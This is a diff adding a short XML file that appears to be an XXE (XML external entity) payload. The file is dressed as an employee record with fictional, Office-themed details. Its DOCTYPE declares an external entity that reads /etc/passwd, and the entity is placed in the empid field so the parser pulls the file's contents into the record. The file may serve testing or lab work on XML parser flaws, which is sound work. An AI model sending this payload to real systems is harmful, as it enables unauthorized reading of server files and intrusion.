@@ -1,0 +1,15 @@
+<!DOCTYPE GVI [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<xml>
+    <firstname>Michael</firstname>
+    <lastname>Scott</lastname>
+    <contactnumber>4573097878</contactnumber>
+    <position>Regional Manager</position>
+    <department>MNG</department>
+    <supervisor>David Wallace</supervisor>
+    <address>123 Fake Street</address>
+    <city>Scranton</city>
+    <state>PA</state>
+    <zipcode>12345</zipcode>
+    <!-- Optional entry <age></age> -->
+    <empid>&xxe;</empid>
+</xml>
